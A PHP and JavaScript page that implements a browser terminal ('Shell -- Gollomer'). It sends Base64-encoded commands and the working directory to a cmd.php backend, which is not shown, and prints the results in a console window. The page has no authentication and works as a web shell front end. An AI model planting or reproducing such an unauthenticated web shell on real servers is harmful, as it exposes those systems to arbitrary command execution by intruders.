<?php

$cur_dir = getcwd();

?>

<script language="javascript" type="text/javascript">


var xmlhttp;

var curdir = "<?php echo $cur_dir; ?>";

var Base64 = {
 
	// private property
	_keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
 
	// public method for encoding
	encode : function (input) {
		var output = "";
		var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
		var i = 0;
 
		input = Base64._utf8_encode(input);
 
		while (i < input.length) {
 
			chr1 = input.charCodeAt(i++);
			chr2 = input.charCodeAt(i++);
			chr3 = input.charCodeAt(i++);
 
			enc1 = chr1 >> 2;
			enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
			enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
			enc4 = chr3 & 63;
 
			if (isNaN(chr2)) {
				enc3 = enc4 = 64;
			} else if (isNaN(chr3)) {
				enc4 = 64;
			}
 
			output = output +
			this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
			this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
 
		}
 
		return output;
	},
 
	// public method for decoding
	decode : function (input) {
		var output = "";
		var chr1, chr2, chr3;
		var enc1, enc2, enc3, enc4;
		var i = 0;
 
		input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
 
		while (i < input.length) {
 
			enc1 = this._keyStr.indexOf(input.charAt(i++));
			enc2 = this._keyStr.indexOf(input.charAt(i++));
			enc3 = this._keyStr.indexOf(input.charAt(i++));
			enc4 = this._keyStr.indexOf(input.charAt(i++));
 
			chr1 = (enc1 << 2) | (enc2 >> 4);
			chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
			chr3 = ((enc3 & 3) << 6) | enc4;
 
			output = output + String.fromCharCode(chr1);
 
			if (enc3 != 64) {
				output = output + String.fromCharCode(chr2);
			}
			if (enc4 != 64) {
				output = output + String.fromCharCode(chr3);
			}
 
		}
 
		output = Base64._utf8_decode(output);
 
		return output;
 
	},
 
	// private method for UTF-8 encoding
	_utf8_encode : function (string) {
		string = string.replace(/\r\n/g,"\n");
		var utftext = "";
 
		for (var n = 0; n < string.length; n++) {
 
			var c = string.charCodeAt(n);
 
			if (c < 128) {
				utftext += String.fromCharCode(c);
			}
			else if((c > 127) && (c < 2048)) {
				utftext += String.fromCharCode((c >> 6) | 192);
				utftext += String.fromCharCode((c & 63) | 128);
			}
			else {
				utftext += String.fromCharCode((c >> 12) | 224);
				utftext += String.fromCharCode(((c >> 6) & 63) | 128);
				utftext += String.fromCharCode((c & 63) | 128);
			}
 
		}
 
		return utftext;
	},
 
	// private method for UTF-8 decoding
	_utf8_decode : function (utftext) {
		var string = "";
		var i = 0;
		var c = c1 = c2 = 0;
 
		while ( i < utftext.length ) {
 
			c = utftext.charCodeAt(i);
 
			if (c < 128) {
				string += String.fromCharCode(c);
				i++;
			}
			else if((c > 191) && (c < 224)) {
				c2 = utftext.charCodeAt(i+1);
				string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
				i += 2;
			}
			else {
				c2 = utftext.charCodeAt(i+1);
				c3 = utftext.charCodeAt(i+2);
				string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
				i += 3;
			}
 
		}
 
		return string;
	}
 
}


function execit()
{
	
	cmd = document.getElementById('cmdline');
	xmlhttp=GetXmlHttpObject();
	if (xmlhttp==null)
	{
		alert ("Your browser does not support XMLHTTP!");
		return;
	}
	var url="cmd.php?cmdline="+Base64.encode(cmd.value)+"&cur_dir="+Base64.encode(curdir);
	xmlhttp.onreadystatechange=gotResponse;
	xmlhttp.open("GET",url,true);
	xmlhttp.send(null);
}


function gotResponse()
{
	if (xmlhttp.readyState==4)
	{
//		alert(xmlhttp.responseText);
		cmd = document.getElementById('cmdline');
		cmd.removeAttribute('disabled');
		mywindow = document.getElementById('window')
		mywindow.innerHTML = document.getElementById('window').innerHTML + " > "+cmd.value+"<br><pre>"+ xmlhttp.responseText + "</pre>";
		document.getElementById('window').scrollTop = document.getElementById('window').scrollHeight;
		cmd.value="";
		cmd.focus();
	}
}

function GetXmlHttpObject()
{
	if (window.XMLHttpRequest)
	{
		// code for IE7+, Firefox, Chrome, Opera, Safari
		return new XMLHttpRequest();
	}
	if (window.ActiveXObject)
	{
		// code for IE6, IE5
		return new ActiveXObject("Microsoft.XMLHTTP");
	}
	return null;
}


function processCommand(evt)
{
	evt = (evt) ? evt : event;
	var charCode = (evt.charCode) ? evt.charCode :((evt.which) ? evt.which : evt.keyCode);
	if (charCode == 13)
	{
		// Enter has been pressed
		cmd = document.getElementById('cmdline');
		if (cmd.value != '')
		{
			if (cmd.value == 'cls' || cmd.value == "clear")
			{
				cmd.value="";
				document.getElementById('window').innerHTML = " > <br>";
				cmd.focus();
			}			
			else
			{
				if (cmd.value == 'cd /')
				{
					curdir = "/";
					cmd.value= '';
					document.getElementById('window').scrollTop = document.getElementById('window').scrollHeight;
				}
				else if (cmd.value == 'cd home')
				{
					curdir = "/home/gollome1";
					cmd.value= '';
					document.getElementById('window').scrollTop = document.getElementById('window').scrollHeight;
				}
				else if (cmd.value.match(/cd/i) != null)
				{
					curdir = cmd.value.replace(/cd/i,'');
					cmd.value= '';
					document.getElementById('window').scrollTop = document.getElementById('window').scrollHeight;
				}
				else
				{
					execit();
					cmd = document.getElementById('cmdline').setAttribute('disabled','disabled');
				}
			}
		}
	}
	return true;
}

function setFocus()
{	
	document.getElementById('cmdline').focus();
}

</script>

<body onload="setFocus()">
<div style="width:100%; height:90%;">
<div style="width:100%; height:24px; background-color:#0000FF; color: #CCCCCC;border: outset 3px #DDDDDD; ">
<span style="padding-left:5px;">Shell -- Gollomer</span>
</div>

<div style="width:100%;background-color:#000000; color: #CCCCCC;border: outset 3px #DDDDDD; border-top: none;height:500px; overflow:auto;">
<div style="position:relative; width:100%; height:500px;">
<span id="window" style="overflow:auto"> 
</span>
</div>
</div>
<div style="width:100%;background-color:#000000; color: #CCCCCC;border: outset 3px #DDDDDD; border-top: none;height:">
&nbsp;>&nbsp;<input id="cmdline" style="border:none;width:98%;background-color:#111111; color: #CCCCCC;" maxlength="255" onkeypress="return processCommand(event);" autocomplete="off" />
</div>
<textarea style="width:100%; height:150px;"></textarea>

</div>
</body>